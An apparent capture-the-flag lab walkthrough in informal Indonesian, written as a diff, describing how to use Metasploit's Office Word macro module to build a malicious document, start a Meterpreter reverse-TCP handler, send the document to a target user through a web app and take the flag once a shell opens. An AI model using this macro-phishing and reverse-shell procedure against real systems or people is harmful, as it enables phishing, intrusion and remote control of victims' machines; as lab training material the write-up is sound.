@@ -1,0 +1,9 @@
+1. buka msfconsole -> set payload windows/meterpreter/reverse_tcp 
+2. terus search ini dah: exploit/multi/fileformat/office_word_macro
+3. use aja -> ikutin aturannya di options -> masukin ip vpn thm aja -> nanti ada file kesimpen di dir .msf gitu
+4. sebenernya ada proses file doc itu diliat di ms office -> terus ada base64 di comment decode aja 
+5. sekarang use multi/handler -> kalau udah set payload sama kek di pertama tadi meterpreter/reverse_tcp
+6. kalau udah set semua nya di options -> exploit dah
+7. sekarang buka ip target tuh di browser -> masuk pake kredensial di deskripsi
+8. buat pesan untuk target di deskripsi marta -> sisipin file hasil msf tadi yang doc itu -> kirim
+9. tunggu meterpreter nya aja di msf -> kalau lama keknya port nya harus sama dah di malware awal ama msf akhir10. kalau dah masuk meterpreter -> ke /users/desktop -> dah klaim flag nya
